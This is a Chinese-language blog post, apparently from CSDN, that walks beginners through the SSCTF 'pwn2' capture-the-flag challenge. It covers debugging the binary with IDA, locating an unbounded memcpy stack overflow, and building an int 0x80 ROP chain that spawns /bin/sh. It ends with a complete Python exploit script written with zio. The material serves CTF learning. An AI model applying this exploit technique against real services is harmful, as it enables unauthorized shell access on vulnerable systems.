@@ -1,0 +1,185 @@
+<div class="blog-content-box">
+ <div class="article-title-box">
+  <span class="article-type type-1 float-left">
+   原
+  </span>
+  <h1 class="title-article">
+   ssctf-pwn2从此入坑不在起
+  </h1>
+ </div>
+ <div class="article-info-box">
+  <div class="article-bar-top d-flex">
+   <span class="time">
+    2017年05月30日 05:09:36
+   </span>
+   <div class="float-right">
+    <span class="read-count">
+     阅读数：680
+    </span>
+   </div>
+  </div>
+ </div>
+ <article>
+  <div class="article_content clearfix csdn-tracking-statistics" data-dsm="post" data-mod="popu_307" data-pid="blog" id="article_content">
+   <div class="markdown_views">
+    <p>
+     说来惭愧，做了这么就才终于将这道简单的栈溢出做出来了。而且还是在师傅的多次帮助下。
+    </p>
+    <p>
+     找了一天的漏洞。刚开始一直以为第一个scanf上有栈溢出，结果怎么调也调不出来，最后在师傅的指引下找到了溢出点，最终成功shell
+     <br/>
+     。这是一个悲伤的故事。好多的基础的东西都忘光了。连linux_server需要使用root权限运行都忘了。其实找到漏洞之后，后面的事情就变得简单了。但是对于我这种新手来说，在简单的事情也会相当的耗时耗力。
+    </p>
+    <p>
+     万事开头难，就以此开始CTF-PWN的旅行！我会从头开始做一个介绍，欢迎入坑！
+     <br/>
+     先说说，该有哪些基本工具。Python环境，IDA，checksh.sh(一个检查保护的脚本)。
+     <br/>
+     直接切入正题
+     <br/>
+     <img alt="ssss" src="https://img-blog.csdn.net/20170530052729092?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     首先检查一下程序都开了哪些保护，STACK CANARY就是栈保护，也就是无法简单的栈溢出覆盖返回值，额~大家查查吧。
+    </p>
+    <blockquote>
+     <p>
+      <a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" rel="nofollow">
+       http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/
+      </a>
+     </p>
+    </blockquote>
+    <p>
+     可以参考下。
+     <br/>
+     这题呢开了NX也就没法执行shellcode了，可能有栈溢出。其实就是栈溢出哈！@
+     <br/>
+     毫不犹豫的
+     <br/>
+     sudo ./linux_server
+     <br/>
+     socat tcp-l:10000,reuseaddr ,fork system:./pwn2 (socat可以通过sudo apt-get install socat安装)
+     <br/>
+     那么前期的准备就准备好咯。要我解释吗？
+     <br/>
+     还是讲讲吧。额~。linux_server是和IDA配合使用的用于两者之间进行调试，可以在IDA的安装路径下找到，socat 是用来fork一个pwn2的一个子进程到10000端口，我们可以通过nc 127.0.0.1 10000 来试着访问这个程序，看看通没通。
+     <br/>
+     写脚本咯。！~
+     <br/>
+     我和师傅都是使用zio模块来写的，我看有的writeup使用pwn模块写的，大差不差吧。自行选择。建议先有一点python的基础，有啥不会写的就上百度
+     <br/>
+     补充一下IDA的简单用法：F9运行到断点处，F2下断点，F8（step over）按语句块执行，不会进入到函数的具体内部，F7(step into)单步执行，注意两者的区别。Alt+T：查找，ctrl+S：选择段；F9：直接调试；Edit | patch program可以修改程序；Debugger | progress options下进行一些连接的设置。基本上就是这些了。不行就百度。
+     <br/>
+     差不多可以开始调试了。
+     <br/>
+     先看一下IDA。F5反汇编。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170530052804389?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     注意是print，不是printf，进去看看。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170530052820655?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     基本上可以确定，洞在这，进到memcpy看看，好乱，不过看名字就知道是个内存拷贝函数。先调调再说。IDA的话，我就不做介绍了，想多了解的上百度(不会就百度，哈哈！！！)
+     <br/>
+     断点下在memcpy之前，
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170530052835467?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170530052845171?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+    </p>
+    <p>
+     可以看到，之前是将我的输入读到了heap中，之后通过memcpy拷贝到stack中，并且没有长度的限制，明显存在overstack，接下来就是覆盖返回地址，构造rop链。由于程序是静态编译，通过构造int 80h中断，使之打开一个shell(int 80 中断号自行搜索)通过alt+T查找。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170530052900358?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     可以看到此时stack已经被我写好了。接下就是任我行。
+     <br/>
+     先通过3号中断，将/bin/sh写到bss段，在执行11(b)号中断,执行。
+     <br/>
+     最后大功告成！！！
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170530052921015?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+    </p>
+    <p>
+     希望大家能通过这题，对栈溢出有基本的了解，能迅速的入个门。不至于十脸蒙B。
+    </p>
+    <p>
+     完了！
+    </p>
+    <p>
+     写在最后。每一次的成功都是经过了大量的失败尝试。
+    </p>
+    <pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> zio <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+target=(<span class="hljs-string">'127.0.0.1'</span>,<span class="hljs-number">10000</span>)
+<span class="hljs-comment">#target=('60.191.205.81',2017)</span>
+io = zio(target, timeout=<span class="hljs-number">10000</span>, print_read=COLORED(RAW, <span class="hljs-string">'red'</span>), print_write=COLORED(RAW, <span class="hljs-string">'green'</span>))
+c2=raw_input(<span class="hljs-string">'go?'</span>)
+
+io.read_until(<span class="hljs-string">'SSCTF[InPut Data Size]'</span>)
+io.writeline(<span class="hljs-string">'150'</span>)
+io.read_until(<span class="hljs-string">'SSCTF[YourData]'</span>)
+
+payload=<span class="hljs-string">'1'</span>*<span class="hljs-number">0x3e</span>     
+
+payload+=l32(<span class="hljs-number">0x0806EFE0</span>)   <span class="hljs-comment">#pop edx ecx ebx  </span>
+payload+=l32(<span class="hljs-number">0x18</span>)+l32(<span class="hljs-number">0x080EBF80</span>)+l32(<span class="hljs-number">0x0</span>)
+payload+=l32(<span class="hljs-number">0x080AD3BA</span>)   <span class="hljs-comment">#pop eax ebx esi edi</span>
+payload+=l32(<span class="hljs-number">0x3</span>)+l32(<span class="hljs-number">0x0</span>)+l32(<span class="hljs-number">0x0</span>)+l32(<span class="hljs-number">0x0</span>)
+payload+=l32(<span class="hljs-number">0x0806F5C0</span>)   <span class="hljs-comment">#int 80 read</span>
+
+payload+=l32(<span class="hljs-number">0x0806EFE0</span>)   <span class="hljs-comment">#pop edx ecx ebx</span>
+payload+=l32(<span class="hljs-number">0x0</span>)+l32(<span class="hljs-number">0x080EBF88</span>)+l32(<span class="hljs-number">0x080EBF80</span>)  <span class="hljs-comment">#dread de can shu</span>
+payload+=l32(<span class="hljs-number">0x080AD3BA</span>)   <span class="hljs-comment">#pop eax ebx esi edi</span>
+payload+=l32(<span class="hljs-number">0xb</span>)+l32(<span class="hljs-number">0x080EBF80</span>)+l32(<span class="hljs-number">0x0</span>)+l32(<span class="hljs-number">0x0</span>)
+payload+=l32(<span class="hljs-number">0x0806F5C0</span>)   <span class="hljs-comment">#int 80 exec</span>
+
+io.write(payload)
+
+c2=raw_input(<span class="hljs-string">'write /bin/sh??'</span>)
+io.writeline(<span class="hljs-string">'/bin/sh\x00'</span>+l32(<span class="hljs-number">0x080EBF80</span>)+l32(<span class="hljs-number">0x0</span>))
+
+io.interact()
+
+</code></pre>
+   </div>
+   <link href="https://csdnimg.cn/release/phoenix/template/css/markdown_views-ea0013b516.css" rel="stylesheet"/>
+  </div>
+  <div class="hide-article-box text-center csdn-tracking-statistics tracking-click" data-mod="popu_376">
+   <a class="btn btn-red-hollow" id="btn-readmore">
+    阅读更多
+   </a>
+  </div>
+ </article>
+ <div class="article-bar-bottom">
+  <div class="article-copyright">
+   版权声明：本文为博主原创文章，未经博主允许不得转载。			https://blog.csdn.net/qq_33438733/article/details/72808279
+  </div>
+  <div class="tags-box artic-tag-box">
+   <span class="label">
+    文章标签：
+   </span>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=漏洞&amp;t=blog" target="_blank">
+    漏洞
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=栈&amp;t=blog" target="_blank">
+    栈
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=linux&amp;t=blog" target="_blank">
+    linux
+   </a>
+  </div>
+  <div class="tags-box">
+   <span class="label">
+    个人分类：
+   </span>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6925810" target="_blank">
+    PWN
+   </a>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6945018" target="_blank">
+    CTF
+   </a>
+  </div>
+ </div>
+ <!-- !empty($pre_next_article[0]) -->
+</div>
